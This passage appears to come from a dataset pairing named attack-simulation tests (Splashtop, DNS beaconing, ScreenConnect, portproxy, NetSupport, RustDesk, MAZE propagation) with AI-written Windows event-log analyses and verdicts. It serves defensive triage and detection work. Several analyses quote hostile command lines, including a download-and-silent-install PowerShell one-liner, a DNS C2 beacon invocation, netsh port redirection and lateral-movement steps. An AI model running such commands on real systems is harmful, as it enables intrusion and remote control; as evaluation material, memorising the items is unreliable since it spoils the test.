5. Evaluate the need for increasing logging, monitoring and implementing stronger threat detection rules to prevent further incidents."
Splashtop Execution,"After thoroughly analyzing the provided log entries across different event channels, I have identified several key activities that, while seemingly benign at first glance, may warrant further investigation due to contextual and temporal anomalies. Here is a detailed breakdown:

1. **Application and MsiInstaller Events**: 
   - The installation of ""Splashtop Personal"" was completed successfully as recorded in multiple logs. This seems benign as it involves a legitimate remote access tool, but its presence on the system and rapid sequential executions deserves additional attention because such tools can be leveraged for unauthorized remote access if not specifically intended for use.
   - Multiple instances of `msiexec.exe` were invoked with temporary directories, suggesting possible installations or updates that might align with software installation activity.

2. **Security Events**:
   - There is a noteworthy event involving a security audit event ID 4799, where `setup.exe` associated with Microsoft EdgeUpdate is executed. The event seems to log a typical behavior seen during updates or installations by Microsoft Edge, which is expected.

3. **Sysmon Logs**: 
   - Frequent execution of temporary executable files such as `splashtop_install.exe` and various instances of InstallShield setups are logged. These exes are associated with software installations, likely as part of the Splashtop or other software setup process.
   - The execution of PowerShell launching processes without significant deviation is recorded with an intention to start a process related to Splashtop, matching observed behavior within the PowerShell logs.

4. **PowerShell Logs**:
   - The PowerShell commands involve operations starting the Splashtop executable, which might align with routine software deployment procedures. Despite appearing normal, it is essential to verify this is expected behavior within your organization.

5. **Microsoft Edge Update Logs**:
   - There is extensive logging related to the update process of Microsoft Edge as indicated by several command lines related to `setup.exe`. It is not uncommon to see Edge updating frequently and might explain the logged EdgeUpdate activities under Sysmon.

**Assessment**:
- **Current User Context**: Activity is shown under the `SERVER002\admin_test` user, which operates at a high integrity level. While this is not inherently suspicious for an admin account, it is crucial to establish whether this deployment and tool installation is standard procedure for this user or system.

**Final Conclusion**: **SUSPICIOUS**

Considering the combination of a remote access tool installation (Splashtop) and the number of installer executions, there could be legitimate usage like software updates occurring. However, given that Splashtop can be a remote access tool often sought in unauthorized access scenarios, the installation and usage must be verified against organizational policy and known user actions. Thus, I recommend further investigation to confirm the legitimacy of these installations and the activities of the user account involved to rule out any potential compromise.

**Guidance on How to Proceed**:
1. **Verify with System Owner**: Confirm with the intended user or IT policies that the installations and updates performed align with scheduled or known deployment actions.
2. **Audit Access Logs**: Review remote access logs tied to Splashtop to ensure any use is sanctioned and in line with company policies.
3. **Review User Activity**: Investigate recent actions by `admin_test` to ensure no unauthorized access or changes were made post-installation.
4. **Scan for Known Threats**: Execute a security solution to monitor the system for any indication of compromise or misconfigured software allowing unauthorized access."
DNS Regular Beaconing,"Upon reviewing the provided logs, several observations indicate potentially malicious activity. Let's analyze each component:

### Windows PowerShell Logs
- The repeated execution of a PowerShell script (`data-dns-beacon.ps1`) from a temporary directory is highly suspicious. The command-line arguments suggest the script is attempting to establish some form of communication using DNS (with options like `-Domain 127.0.0.1.nip.io -Subdomain file -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30`).
- Such scripts are often used for Command & Control (C2) communication in malware to evade detection by using DNS queries to communicate with a remote server.

### System and Time Changes
- There are entries indicating changes to the system time. The adjustments performed by `svchost.exe` with reasons noted imply unauthorized or suspicious time tampering.
- While time changes can be legitimate, in the context of other suspicious activities, it could indicate an effort to obscure timelines within logs or to avoid triggering certain defenses dependent on time-specific rules.

### Sysmon Logs
- The execution of utilities like `whoami.exe`, `wevtutil.exe`, and repeated `powershell.exe` processes in rapid succession is indicative of reconnaissance or an attempt to manipulate event logs (potentially log cleaning with `wevtutil.exe`).
- The presence of hashes and execution integrity levels implies legitimate utilities were used (at least superficially), but the context suggests misuse for malicious purposes.

### Security Logs
- The security audits confirming the system time alterations further emphasize a potential compromise. These were performed by `svchost.exe`, likely under the pretense of a legitimate service but in a suspicious context.

### Conclusion
The presence of a PowerShell script designed for DNS-based C2, system time alterations, and suspicious usage of system utilities together form a pattern typical of malicious activity.

### Recommended Actions
1. **Network Isolation**: Immediately isolate the affected host to prevent any further potentially harmful communication.
2. **Forensic Analysis**: Conduct a deep forensic analysis to understand the full scope of the breach and the payload(s) involved.
3. **Review Scripts/Tasks**: Analyze all scheduled tasks and scripts on the system, especially within `C:\Users\ADMIN_~1\AppData\Local\Temp\`.
4. **Audit Logs**: Review network logs, firewall rules, and any alerts around the timestamp of the events.
5. **Patch and Update**: Ensure the system and software are up to date with security patches post analysis.

Nimgrab - Transfer Files,"Based on the provided Sysmon logs, I will analyze the entries to identify any suspicious or malicious behavior.

1. **Process Execution**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed in quick succession by the user `SERVER002\admin_test`. Frequent, automated execution of system processes in a short time frame can be indicative of script or batch file automation. The use of `wevtutil.exe`, a tool for managing Windows Event Logs, could potentially be used to clear logs, a tactic employed by attackers to cover their tracks.
   
2. **Use of PowerShell**:
   - The presence of PowerShell execution is noted, but without command line details, we cannot conclusively assess its intent. However, PowerShell being used in conjunction with other suspicious behavior can be a red flag.

3. **Cmd.exe Execution with Download**:
   - The command line argument for `cmd.exe` shows an attempt to download data using `nimgrab.exe`, which appears to be an external command executed. This action seems to fetch data from `https://raw.githubusercontent.com/file/file-file/master/LICENSE.txt` into a temporary location (`$env:TEMP\file-license.txt`). This behavior is highly suspicious, as it involves the execution of a potential custom or unknown tool (`nimgrab.exe`) to download external resources.

4. **Normal Activity**:
   - The presence of tools like `hostname.exe` and `whoami.exe` are typically benign as they are often used for system information gathering, especially when dealing with systems administration.

**Assessment**:
- The automated execution of `wevtutil.exe` could suggest an attempt to manipulate or clear event logs.
- The `cmd.exe` line with `nimgrab.exe` downloading content is unusual and likely suspicious for normal user activity, especially in an administrative environment.

**Threat/Risk**:
- The most significant risk identified is the potential use of tools to download and possibly execute remote resources with `nimgrab.exe`. This suggests possible unauthorized remote access or data exfiltration attempts.
- The `wevtutil.exe` executions could be attempts to tamper with logs, typically seen in post-exploit scenarios.

**Guidance**:
- Investigate the source and purpose of `nimgrab.exe`. Determine whether it is a legitimate tool or associated with known malware.
- Review any associated logs or artifacts related to `wevtutil.exe` usage to verify if event logs were altered or cleared.
- Conduct a review of system integrity to confirm no unauthorized changes or backdoors have been introduced.
- Audit user `SERVER002\admin_test` to ensure that the account has not been compromised.

**Resolution**:
- **SUSPICIOUS**: The logs contain activity that appears unusual, notably the execution involving `nimgrab.exe` and the frequent use of `wevtutil.exe`. Further investigation is necessary to confirm whether this activity is benign or malicious."
File download with finger.exe on Windows,"Upon analyzing the provided Windows event logs, several activities suggest potential anomalies that need closer examination. Here's a detailed analysis:

### Observations:
1. **Security Logs:**
   - The user `admin_test` is seen logging on and off with various privileges. Specifically, `EventID 4672` shows that `admin_test` is assigned a wide range of privileges typically associated with administrative tasks, including `SeDebugPrivilege`, which is often exploited for malicious activities.
   - There are two `EventID 4624` (logon events) entries for `admin_test` with `LogonType 3` indicating network logon, which could be normal. However, having administrative privileges and a network logon might be concerning if unexpected.

2. **System Logs:**
   - The adjustment of the system clock, as seen from `EventID 1` and `EventID 24` events, often happens during legitimate operations. However, it's worth considering if these changes align with known maintenance windows or updates to ensure nothing suspicious occurred.

3. **Sysmon Logs:**
   - The execution of `cmd.exe` with the command line argument `""cmd.exe"" /c finger base64_filedata@localhost` is highly suspicious. The `finger` command is used for user information queries, and it's uncommon in modern usage, especially with such parameters suggesting possible data exfiltration or exploration within the system.
   - The regular appearance of processes such as `wevtutil.exe` and `conhost.exe` can be normal, but in conjunction with the other activities, they should be verified especially if they're not part of routine operations.
   - The execution of several instances of `MicrosoftEdgeUpdate.exe` processes seems typical during an update, but it should be verified against the actual update schedule to confirm legitimacy.

4. **Application Logs:**
   - Several Edge Update service stop events are captured but serve more as operational rather than direct indicators of compromise.

### Assessment:
While there are legitimate activities in the logs, there are several elements, especially the PowerShell usage and unusual command executions (`finger` command), that are not characteristic of regular user behavior. The privilege allocations and admin activities warrant closer inspection, especially if there was no clear justification or change management to support them.

### Resolution: SUSPICIOUS
The collected logs indicate suspicious activities, specifically the use of the `finger` command with base64-like arguments and network logons with elevated privileges. These activities require further investigation to determine if they are part of normal administrative tasks or potential indicators of compromise.

### Recommendations:
- **Investigate User Activity:** Check with the user `admin_test` or IT admin team to validate if these actions were authorized or if they're part of routine operations.
- **Review Change Management Records:** Validate if the elevated privileges and clock changes align with any scheduled maintenance or updates.
- **Inspect System Configurations:** Ensure no unauthorized scripts or tasks are scheduled that could align with the executed commands.
- **Conduct a Threat Hunt:** Look into other systems for similar patterns in logs that could point towards lateral movement or additional compromise.
"
Steganographic Tarball Embedding,"Upon analyzing the provided Windows event logs, I have identified several points that could suggest suspicious or malicious behavior:

1. **Repeated Execution of Microsoft Edge Installer:**
   - Multiple instances of `setup.exe`, related to Microsoft Edge Installer, are being executed in a short period. While this could indicate an update process, the frequent launches, and specific command-line arguments such as `--verbose-logging` and system-level privileges should be monitored. These could align with malicious activities where legitimate applications are leveraged to perform unauthorized actions.

2. **PowerShell Activity:**
   - The PowerShell command execution appears complex and manipulates files in the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory and `$env:PUBLIC\Downloads`. The command reads data from `.jpg` and `.tarz` files, potentially indicating data extraction or obfuscation.
   - This behavior, especially involving PowerShell, is a common technique used by attackers to execute scripts for data exfiltration or lateral movement within networks.

3. **Execution of `wevtutil.exe` Commands:**
   - The tool `wevtutil.exe`, which is mostly used to query, export, and clear event logs, is run by a non-standard user (`SERVER002\admin_test`). This might be an attempt to tamper with logs to erase traces of other activity.
   - Frequent and successive execution of `wevtutil.exe` is a known method to hinder forensic investigations by clearing event logs.

4. **Execution of `hostname.exe` and `whoami.exe`:**
   - These commands are executed in quick succession, indicating user enumeration and potential mapping of network information, which can be part of reconnaissance activities by an attacker.

Considering these observations, my assessment of the situation is as follows:

- **SUSPICIOUS**: The log entries display a combination of software updates and potentially manipulative actions such as frequent installer execution, suspicious use of PowerShell, and the presence of tools like `wevtutil.exe` for process monitoring or cleanup, which does not line up with regular user activity.

### Recommendations:
1. **Conduct a Full Investigation:**
   - Follow up on this suspicious activity by examining any related network traffic, especially outgoing connections, to affirm or deny the presence of data exfiltration.
   - Cross-reference these logs with logs from other systems to detect similar patterns potentially indicative of lateral movement.

2. **Limit PowerShell Execution:**
   - Consider enforcing constraints on the use of PowerShell scripts to prevent unauthorized or risky script execution.

3. **Monitor and Alert:**
   - Set up alerts for similar activities in the future, particularly tracking the `wevtutil.exe` command execution and any unknown processes initiated by privileged accounts.

4. **User Access Review:**
   - Verify the integrity and recent activities of the user account `admin_test` to ensure it has not been compromised or misused.

Continued vigilance and detailed investigation will be crucial to fully ascertain the security posture and address any potential threats."
MAZE Propagation Script,"**Analysis of Logs:**

Upon reviewing the provided logs across different sources (Sysmon, Windows PowerShell, Application), a number of noteworthy activities have been identified.

1. **PowerShell Execution:**
   - The logs indicate a suspicious use of `PowerShell`, which was executing a potentially malicious script. The command line extracted from the PowerShell event log involves the execution of a script that attempts to:
     - Test connectivity to multiple machines using `Test-Connection`.
     - Copy data using `cmd /c copy` to multiple remote hosts.
     - Use `WMIC` to execute `regsvr32.exe` on the remote hosts.
   - The use of `regsvr32.exe` is particularly concerning as this is a well-known technique (Regsvr32 Method) used for loading code into a system, often indicative of a lateral movement or code execution attempt.

2. **Users and Privilege:**
   - Most activities are carried out by ""SERVER002\\admin_test"", generally indicating that an administrative context is being utilized. While under normal circumstances, administrative tasks may seem legitimate, the context in which these tasks are being executed (automating batch execution over network machines) suggests potential abuse of administrative rights.

3. **Event Timing and Frequency:**
   - The rapid succession of executions and process creations, as shown in the Sysmon logs, supports potential automation or scripting. Given these events occur in quick succession, it supports the notion of script-based execution, commonly used in attacks aimed at persistence or spreading.

4. **Program Behavior:**
   - The repeated execution of native Windows binaries like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`, in conjunction with PowerShell, implies an abnormal chain of operations. While each binary individually might look benign, the context of execution indicates reconnaissance or setup actions normally seen in penetration testing or compromised environments.

**Conclusion:**

- Based on the evidence, a potentially malicious operation is being executed using PowerShell scripts. The script attempts network propagation, file transfers, and remote code execution using legitimate Windows processes, all of which are classified behaviors for versatile malicious attacks, including but not limited to behavior normally associated with advanced persistent threats (APTs) or malware.

**Resolution:**
- **MALICIOUS**: The logs suggest a high probability of malicious activity involving PowerShell scripts that try to communicate across the network, execute files, and use known Windows processes in suspicious contexts. Immediate attention and further investigation are advised, possibly involving isolation of affected systems, examination of remote systems mentioned in scripts, and an in-depth review by a security response team. Additional protective measures, such as validating script execution policies and reviewing administrative rights and access logs, should be undertaken for remediation and prevention of further incidents."
Arbitrary file download using the Notepad++ GUP.exe binary,"### Detailed Analysis of the Logs

Upon thoroughly analyzing the Windows event logs provided, I've identified and evaluated several activities that might indicate suspicious or malicious behavior:

1. **Microsoft Edge Update Activity**:
   - **Frequent Update Executions**: There are multiple Sysmon events indicating the execution of various Microsoft Edge Update processes. This activity includes several instances of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` running under the `NT AUTHORITY\SYSTEM` account, which itself is not inherently suspicious unless there are deviations from the expected update sequences or intervals.
   - **Temporary Directory Utilization**: An update process is executed from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EUA30C.tmp\\`), which can sometimes indicate a crafted or malicious update. However, given that the file versions and command lines align with typical update behavior, this doesn't immediately raise concern without additional context.

2. **Command Line Execution**:
   - **Suspicious Command Line with `cmd.exe`**: There is a `cmd.exe` process used to create a directory and download a file from an external URL (`https://getsamplefiles.com/download/zip/sample-2.zip`) using `GUP.exe`. This action involves:
     - Creating a directory in `C:\Temp`.
     - Navigating and executing from a user-specific temporary location: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\`.
     - Executing `GUP.exe` to unzip a file from an external source.
   - This operation is potentially suspicious as it involves downloading and executing content from an external source, and could be indicative of a download-and-execute attack pattern.

3. **Execution of Administrative Tools**:
   - The logs show the execution of tools like `wevtutil.exe`, `whoami.exe`, and `hostname.exe` by a user with elevated privileges (`SERVER002\admin_test`). These commands are often used in typical administrative tasks but could also be leveraged by an attacker to gather system information or manipulate event logs.

4. **Lack of Relevant Security Logs**:
   - There are no security log entries provided for evaluation, making it challenging to correlate sysmon activities with authentication logs or identify privilege changes or unauthorized access attempts.

### Assessment and Resolution
- **Suspicious Activity**: The use of command-line processes to fetch and execute files from an external URL warrants cautious scrutiny. While it is common for certain applications to download updates, this specific sequence suggests possible unauthorized activities or the deployment of potentially unwanted programs.
- **Indicators of Malicious Activity**: The persistent and concurrent execution of system-related processes in tandem with potential lateral movement commands (e.g., `whoami.exe`, `hostname.exe`) can be indicative of environment reconnaissance used by attackers.
  
### Resolution: **SUSPICIOUS**

Given the observed command-line activity involving external downloads and the execution of administrative commands by a user, the logs are classified as **SUSPICIOUS**. This requires further investigation and the following actions:
- **Verification of Downloaded Content**: Analyze the downloaded file (`sample-2.zip`) for malicious content or data transferred during its acquisition.
- **Correlation with Network Logs**: Check firewall and intrusion detection alerts for any unusual outbound connections coinciding with the event timestamps.
- **Analyze Software Update Patterns**: Confirm whether the Microsoft Edge Update is consistent with known and legitimate updates.
- **Audit User Activities**: Investigate the activities and history of the `SERVER002\admin_test` user to determine if actions align with typical user behavior or indicate compromise.

Further investigation and correlation with network and additional security controls are recommended to fully assess these activities."
ScreenConnect Application Download and Install on Windows,"After analyzing the provided Windows event logs, several notable events and patterns suggest potentially suspicious and possibly malicious activities. Here's the breakdown of the analysis:

1. **ScreenConnect MSI Installation:**
   - Repeated logs show the installation of `ScreenConnect.msi` from a user directory using `msiexec`. The ScreenConnect application, commonly used for remote support, can be legitimate but is often used by attackers for unauthorized remote access.

2. **PowerShell Command Execution:**
   - The logs indicate PowerShell was used to download the MSI file using `Invoke-WebRequest`. This activity is suspicious, as PowerShell is a commonly exploited tool for executing scripts or downloading and executing malicious payloads.
   - Specifically, the PowerShell command `& {$installer = ""\""C:\\Users\\$env:username\\Downloads\\ScreenConnect.msi\""""; Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""; msiexec /i $installer /qn}` suggests the automated and silent installation of this package. The use of `cloudfront.net` for delivery is atypical outside specific environments and raises further suspicion.

3. **User and Execution Context:**
   - The actions were executed under the `SERVER002\admin_test` user context, indicating privileged access which aligns with installing software. However, this account usage for such actions, especially with an administrative username with ""test"", should be critically reviewed to ensure it's legitimate and authorized.

4. **Event Patterns and Timing:**
   - Events occurred in a rapid sequence, from PowerShell execution, file downloads, to installation within a minute. This speed is typical for automated scripts but not for manual or legitimate administrative tasks, which can suggest automation often characteristic of malicious activity.

Based on these findings, here is the assessment of the situation:

- **Threats/Risks Identified:** Potential unauthorized remote access via ScreenConnect installation, misuse of PowerShell and administrative privileges to execute potentially harmful software.

- **Guidance on How to Proceed:**
  - Immediately verify the legitimacy and necessity of the `ScreenConnect` tool on this host. If unauthorized, terminate the process, and consider blocking the MSI and related URLs.
  - Conduct a thorough review and audit of the user account `admin_test`, verifying recent activities, changes to user settings, and access permissions.
  - Implement monitoring for similar PowerShell and MSI activities, which are indicators of potential malicious actions.
  - Ensure endpoint security solutions can detect and respond to unauthorized script execution and remote tool installations.

**Resolution:** The logs are classified as **MALICIOUS**, given the combination of remote access tool installation, use of PowerShell to download potentially unsafe components, and the apparent lack of clear legitimate purposes for these actions."
Lolbas replace.exe use to copy file,"Upon analyzing the Windows event logs provided, I identified a series of logs from an isolated time period (October 24, 2024) with repeated and similar pattern activities. Here are the pertinent observations:

1. **Repeated Process Creations**: There are multiple instances of operations involving `cmd.exe`, `replace.exe`, `wevtutil.exe`, and `whoami.exe`. While the `cmd.exe` and `replace.exe` activities are slightly obfuscated, possibly indicating the deletion and replacement of files (`del %%TEMP%%\\file.cab & replace.exe ...`), the repeated spawning of `wevtutil.exe` is particularly notable. It is used for managing event logs, which may be indicative of an attempt to clear logs or hide traces.

2. **High Integrity Level Operations**: Several processes run at a `High` Integrity Level, being launched by the user `SERVER002\\admin_test`, suggesting an account with elevated privileges, which may be used in lateral movement or privilege escalation attempts.

3. **Command-Line Arguments**: The command-line used in the `cmd.exe` suggests scripted or automated operations involving file deletion and replacement, hinting at possibly malicious behavior such as payload delivery or system manipulation.

4. **Microsoft Edge Update**: The logs capture a legitimate system update, involving Microsoft Edge, executed under the `NT AUTHORITY\\SYSTEM` account with activities aligning with standard update practices. The Edge update process does not raise alarms since it uses typical command-line arguments and file paths consistent with automatic update mechanisms.

5. **Absence of Security Logs**: There's a conspicuous absence of any security logs, which should typically record user activity, logons, etc. The lack of such logs can itself be indicative of attempts to clear or tamper with logs to cover an attacker's tracks.

### Assessment:

- **BENIGN**: Some actions, like the Microsoft Edge update, align with normal Windows Update behavior. However, when examining the context of the overall log, these alone would not justify labeling the activity as benign.
  
- **SUSPICIOUS**: The frequent creation of processes like `wevtutil.exe` under an admin account, coupled with commands involving file operations (`cmd.exe` & `replace.exe`), and the absence of security logs are not typical of benign operations and warrant further investigation.

- **MALICIOUS**: Despite the presence of suspicious behavior, there's no definitive evidence of harmful intent like known malicious hash values or direct attack indicators (e.g., backdoor installation). Therefore, the activity doesn't conclusively indicate maliciousness.

### Recommendation:

- **Resolution**: **SUSPICIOUS**

Further investigation is warranted to determine the intent and necessity of these activities:
1. **Review the Context**: Gather additional contextual data regarding scheduled tasks, administrative scripts, or recent updates that might explain this activity pattern.
2. **Check User Activity**: Confirm if the `admin_test` account was legitimately in use during these events or if there was any sign of compromise (e.g., unusual sign-in locations).
3. **Forensic Analysis**: Conduct a forensic analysis of the machine to identify any potentially unauthorized changes or presence of malicious files.
4. **Review Configurations**: Ensure logging configurations and account privileges are secure and assess any recent changes or deployments that could align with this activity."
portproxy reg key,"Based on the Windows event logs provided, let's analyze the entries for any suspicious or malicious activity. 

### Analysis

#### Windows PowerShell Logs

The PowerShell logs indicate a command was run through `powershell.exe` using the following syntax:
`powershell.exe & {netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1}`

- **Port Redirection Configuration**: The command is configuring a local port proxy that listens on port 1337 and redirects the traffic to the same port on `localhost` (127.0.0.1). While port redirection can be legitimate for certain applications, the usage of port 1337 (often associated with potentially malicious or backdoor activities) and the lack of documentation around why this action was taken suggests suspicious behavior.

#### Sysmon Logs

- **Process Execution**: There are multiple Sysmon EventID 5 entries which indicate the issuing of the `wevtutil.exe` and `conhost.exe`. However, a critical log for analysis is the Sysmon EventID 1 for `netsh.exe`:
    - It reflects the execution of the command to add the port proxy. Combined with the PowerShell logs, it confirms this activity was executed.

- **Command Execution Context**: The action was carried out by a user named `SERVER002\\admin_test` with high integrity, indicating administrative privileges were used to execute the command.

- **Parent-Child Process**: The parent process for executing `netsh.exe` is `powershell.exe` further confirming the initial PowerShell command triggered the `netsh` operation.

#### Application, Security, and System Logs

- **Software Protection Platform**: A solitary entry indicating normal operation and updates of the Software Protection Platform (SPP). Nothing suspicious here related to the task.
- **Lack of Security and System Logs**: These logs are missing, limiting our ability to correlate other system-level changes or failed login attempts that might indicate compromise or malicious activity.

### Assessment

The repeated execution of netsh for port proxy setup by PowerShell, along with the choice of port, and execution through an administrative account raises suspicion. This activity, combined with lack of justification and documentation forms a potential security risk.

### Resolution

- **Resolution: SUSPICIOUS**

#### Actionable Guidance

1. **Further Investigation Needed**:
   - Verify with the server maintenance logs or associated personnel to determine the legitimacy of running port proxy on port 1337.
   - Check if similar configurations exist in other servers for intended purposes.
   - Scan network logs for connections on port 1337 to ensure no unauthorized communications are occurring.
   - Review user account activity for `admin_test` and investigate if any anomalous access patterns are present.

2. **Immediate Actions**:
   - If unauthorized, remove the port proxy configuration to eliminate immediate risk.
   - Ensure that security policies or guidelines are aligned to warn against use of PowerShell for such open network redirections.

3. **Monitor Enhanced Logging**:
   - Employ more detailed audit logging and alerts for any future execution of `netsh`, PowerShell commands with similar patterns, and unusual port configurations.

This approach aims to ensure that all potential risks are addressed without interrupting legitimate system operations unnecessarily."
Download a file with Microsoft Connection Manager Auto-Download,"Upon analyzing the provided Windows event logs, the following observations and conclusions can be drawn:

### Assessment of Log Entries

   - **Frequent Execution of PowerShell and Command-Line Utilities:**
     - There is an occurrence of PowerShell execution by the user `SERVER002\admin_test`, which could be benign if it's part of administrative or routine tasks. However, PowerShell could be used for malicious activities such as downloading and executing remote scripts.
     - Multiple executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\admin_test` are also noted. `wevtutil.exe` is a legitimate tool used to manage event logs but could be used by attackers to clear logs to cover their tracks.
   - **Edge Update Executions:**
     - Numerous processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`) are executed under `NT AUTHORITY\SYSTEM`. These relate to the update and installation activities of Microsoft Edge which generally seem legitimate as they follow typical software update patterns.
   - **Batch File Execution from Temp Directory:**
     - The execution of a batch file (`data.bat`) from the user's temp directory using `cmd.exe` could be suspicious, especially as it redirects output to null, potentially indicating an attempt to execute a script without tracing or output, which can be a technique used for malicious activities.

2. **Application Log Observations:**
   - **Edge Update Service Activity:**
     - The event ""Service stopped"" related to `edgeupdate` suggests normal service operations for stopping and presumably starting or updating the software.
   - **Security Products Running:**
     - Updates indicating that Windows Defender is active, which suggests that there is at least some level of endpoint security present on the system.

3. **Other Logs:**
   - The System, Security, and Windows PowerShell logs do not appear to have significant entries available or provided for investigation.

### Conclusion and Guidance

- **Resolution: SUSPICIOUS**
  - The activities around PowerShell, `wevtutil.exe`, and the execution of a batch file from the temp directory merit further investigation. While these actions might be legitimate, they can also be exploited for malicious purposes.
  - The context of batch file execution, especially with output redirected to null, where potentially harmful script activities could be hidden, requires deeper scrutiny.

### Recommended Actions

1. **Review PowerShell Commands:**
   - Examine any PowerShell scripts or command-line arguments executed to determine if they contain unauthorized or suspicious commands.

2. **Investigate Batch File:**
   - Analyze the contents and origin of the `data.bat` file executed from the temp directory. Check if this file is part of any known administrative script or unauthorized task.

3. **Audit User Activity:**
   - Verify the role and activities of the `admin_test` account to ascertain that all activities align with policy and job responsibilities. Ensure there is no unauthorized escalation or misuse of administrative privileges.

4. **Monitor and Secure:**
   - Continue monitoring for unusual activities and consider enhancing security measures such as additional logging (if not already in place), endpoint detection solutions, and user behavior analytics.

Proceeding with a cautious approach will help ensure that any potential compromises are identified and mitigated promptly."
NetSupport - RAT Execution,"### Detailed Analysis of the Event Logs

After thoroughly examining the provided Sysmon, Windows PowerShell, Application, and various other logs, the following observations were made regarding potential indicators of compromise or suspicious activity:

1. **Repeated Execution of Known Binaries**:
   - The logs show repeated execution of legitimate Windows binaries such as `wevtutil.exe` and `conhost.exe`. These are common Windows utilities, often used for event log management and console session facilitation, respectively. However, their usage is not inherently suspicious on its own.

2. **Execution Pattern of NetSupport Manager**:
   - Logs reveal the execution of `data_NetSupport.exe`, which belongs to NetSupport Manager, a legitimate remote support tool, via PowerShell. The PowerShell command uses `Start-Process` to run `data_NetSupport.exe` with `/S /v/qn` arguments, indicating a silent or quiet installation.
   - The sequence of events around the execution of `data_NetSupport.exe` includes:
     - Starting via PowerShell
     - Associated with `msiexec.exe` to handle MSI installation commands
     - Attempts to modify file attributes of licensing files within temporary directories using `cmd.exe`.
   - The key point is the presence of NetSupport Manager in a non-standard directory (e.g., a directory within `AppData`). This, combined with silent installation flags, might point to misuse despite being a legitimate tool.

3. **Installation Failures**:
   - There are events indicating installation failures of NetSupport Manager (`Installation operation failed`). This might point towards either attempts to install the application without necessary permissions or conflicts during installation.

4. **Integrity and User Context**:
   - Actions were executed under the context of `SERVER002\\admin_test` with high integrity, suggesting administrative privileges were used. Leveraging high integrity levels can be appropriate for regular administrative actions but can be dangerous if exploited by malicious actors.

5. **Microsoft Edge Updates**:
   - There are multiple events relating to `MicrosoftEdgeUpdate.exe`, which appear routine and expected, occurring under the `NT AUTHORITY\\SYSTEM` account with system-level integrity.

### Assessment and Resolution

While the execution patterns involving `data_NetSupport.exe` deserve attention, the lack of explicit malicious intent or unauthorized access in the logs requires a cautious approach.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Verification of NetSupport Manager Usage**:
   - Confirm whether `data_NetSupport.exe` was intentionally deployed as part of legitimate IT operations. Verify with IT staff whether there's an authorized use case for installing this tool in the environment.

2. **PowerShell Command Review**:
   - Examine the logs of the `PowerShell` usage for any unauthorized command or script execution, especially focusing on execution contexts, arguments, and installations happening without normal user awareness.

3. **File and Network Monitoring**:
   - Use `Sysmon` or equivalent monitoring tools to further trace file creation and modifications within the directories linked to `data_NetSupport.exe`. Check for unusual network connections initiated by this executable.

4. **Update and Patch Management**:
   - Ensure that the system is up-to-date with the latest patches and that security settings for running scripts and installing executables adhere to security policies.

5. **Audit and User Access**:
   - Conduct an audit of the user account `admin_test` to ensure it is being used appropriately and is protected with strong credentials. Check for misconfigurations that might have allowed the behavior observed.

By taking these steps, further clarity on whether the observed behavior is part of an ongoing threat or otherwise benign can be achieved."
RustDesk Files Detected Test on Windows,"Upon analyzing the provided Windows event logs for the host 'Server002', several key observations indicate possible malicious activity:

1. **Time manipulation and svchost.exe usage:**
   - Event logs show changes in system time by the `svchost.exe` process (as seen in the System logs), which could indicate attempts to evade detection or timestamp manipulation for malicious intent.
   - The `svchost.exe` process, while a legitimate Windows process, is commonly abused by malware to hide its activities. The changes in system time without a legitimate necessity (like a time synchronization) can be a suspicious indicator.

2. **Execution of PowerShell with suspicious command:**
   - The Sysmon and Windows PowerShell logs reveal that a PowerShell command was executed by the user `admin_test`. This script downloads and executes a binary (rustdesk-1.2.3-1-x86_64.exe) from an external source, which is a clear indicator of potentially malicious behavior especially since it's done silently with the `/S` flag suggesting a silent installation.
   - Downloading executables directly from the internet and executing them in this manner is common in scenarios involving lateral movement or malware installation.

3. **Unauthorized process execution and taskkill:**
   - There are multiple instances of processes being executed from user directories and attempts to terminate certain processes like `RuntimeBroker_rustdesk.exe` using `taskkill.exe`. Terminating processes can be indicative of attempts to disable monitoring tools or other protective measures.

4. **Elevated privileges and potentially sensitive credential access:**
   - There are logs indicating elevated privileges allocated to `admin_test`, along with attempts to access Microsoft account-based resources and potential enumeration of admin accounts (seen with well-known SIDs in the event logs).
   - The sequence of Event ID 5379 showing failed attempts to retrieve or use credentials can suggest a potential attempt at privilege escalation or lateral movement.

Based on these observations, the activity in the logs presents several indications of potentially unauthorized and harmful behavior. The procedure of using PowerShell to download and execute a widely unknown or unmanaged executable and the subsequent activities align with common tactics used in malicious campaigns.

### Resolution: MALICIOUS

**Guidance on how to proceed:**
- Immediately isolate the machine from the network to prevent any potential spread of unwanted activity to other machines.
- Conduct a deep malware scan on the host using updated anti-malware software.
- Review network traffic logs correlated to the time of the downloads and execution to identify any command and control communication.
- Audit the credentials and permissions of the user `admin_test` for unauthorized access.
- Assess the need to apply additional endpoint protection policies to restrict the use of powerful tools like PowerShell.
- Revert any unauthorized changes, such as time changes made by `svchost.exe`.
- Consider restoring the system from a clean backup point prior to the identified malicious activity if the system integrity is compromised.
- Review and harden security configurations across the network to prevent similar incidents in the future."
Embedded Script in Image Execution via Extract-Invoke-PSImage,"### Detailed Analysis of the Logs

**Suspicious or Anomalous Behavior:**

1. **PowerShell Activity:**
   - The logs contain multiple instances of PowerShell activity, specifically the execution of a script that utilizes the `Extract-Invoke-PSImage.ps1` module. The activity is directed at extracting a script from an image file (`evil_kitten.jpg`), suggesting the use of steganography to conceal potentially malicious scripts.
   - The extracted script is then processed to decode Base64-encoded content, indicating an effort to hide the payload from straightforward detection.
   - The decoded content is subsequently executed, evidenced by the script path `$HOME\textExtraction.ps1`. This behavior is consistent with techniques used to execute hidden or obfuscated payloads.

2. **Use of `wevtutil.exe`:**
